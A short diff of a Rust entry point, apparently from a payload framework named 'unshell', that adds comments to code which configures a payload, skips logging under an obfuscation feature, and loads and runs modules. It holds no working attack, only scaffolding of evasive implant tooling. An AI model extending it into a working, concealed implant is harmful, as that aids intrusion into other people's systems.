@@ -11,6 +11,7 @@ use unshell_obfuscate::{obs, symbol};
 #[macro_use]
 extern crate unshell_lib;
 
+// The main and initial 'configuration' for a payload
 lazy_static! {
     static ref PAYLOAD_CONFIG: PayloadConfig = PayloadConfig {
         id: symbol!("Test ID"),
@@ -24,6 +25,7 @@ lazy_static! {
 }
 
 fn main() {
+    // Init the logger
     #[cfg(not(feature = "obfuscate"))]
     unshell_lib::logger::PrettyLogger::init();
 
@@ -32,12 +34,14 @@ fn main() {
     match || -> Result<(), ModuleError> {
         let args = std::env::args();
 
+        // TEMPORARY, load the module paths from command line args.
         let mut modules = Vec::new();
         for arg in args.skip(1) {
             debug!("Loading module: {}", arg);
             modules.push(Module::new(&arg)?)
         }
 
+        // Run the manager, this is blocking.
         Manager::run(&PAYLOAD_CONFIG, modules);
 
         Ok(())
